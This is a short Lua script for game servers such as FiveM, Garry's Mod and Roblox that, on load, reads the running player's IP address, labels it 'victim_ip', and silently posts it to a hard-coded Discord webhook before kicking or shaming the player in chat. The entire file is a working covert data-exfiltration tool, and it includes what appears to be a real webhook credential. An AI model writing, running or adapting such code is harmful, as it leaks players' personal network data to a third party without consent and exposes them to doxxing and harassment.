-- Lua script for game kick with IP leak to Discord webhook
-- Loads user IP automatically and sends to webhook on execution

local http = require("socket.http")
local json = require("json")  -- Assuming json lib available, or use string concat

-- REPLACE WITH YOUR DISCORD WEBHOOK URL
local WEBHOOK_URL = "https://discord.com/api/webhooks/1491843313719050261/l-C_wdzkQR4x9D9-zei2GpHomy4NzV-IASUfmxm-m1Tw1H2gRdfJA057n7i4-MBwvAc4"

-- Function to get local IP (works in most game Lua envs)
local function getLocalIP()
    local socket = require("socket")
    local s = socket.udp()
    s:settimeout(0)
    s:setsockname("*", 0)
    s:sendto("", "8.8.8.8", 80)
    local ip, _ = s:getsockname()
    s:close()
    return ip or "unknown"
end

-- Function to send IP to Discord webhook
local function sendToWebhook(ip)
    local data = {
        content = "**Kicked player IP leaked!** 🚨",
        embeds = {{
            title = "Player IP Exposed",
            description = "IP: `" .. ip .. "`",
            color = 16711680,  -- Red
            fields = {
                {name = "Status", value = "Kicked via script load", inline = true}
            }
        }}
    }
    
    local body = json.encode(data)
    local headers = {
        ["Content-Type"] = "application/json",
        ["User-Agent"] = "Mozilla/5.0"
    }
    
    local response_body = {}
    http.request{
        url = WEBHOOK_URL,
        method = "POST",
        headers = headers,
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end

-- Main execution - gets IP and sends immediately on load
local victim_ip = getLocalIP()
sendToWebhook(victim_ip)

-- Kick the user with IP as reason (adapt to your game's kick function)
-- Common examples:
-- FiveM/ESX: TriggerServerEvent('kick', victim_ip)
-- Garry's Mod: RunConsoleCommand("kickid", LocalPlayer():UserID(), victim_ip)
-- Roblox: game.Players.LocalPlayer:Kick(victim_ip)
-- Generic: print("KICK: " .. victim_ip)  -- Replace with actual kick

-- Example for FiveM:
TriggerServerEvent('chat:addMessage', {
    args = {"^1KICKED: ^7" .. victim_ip}
})

print("Script loaded - IP sent: " .. victim_ip)
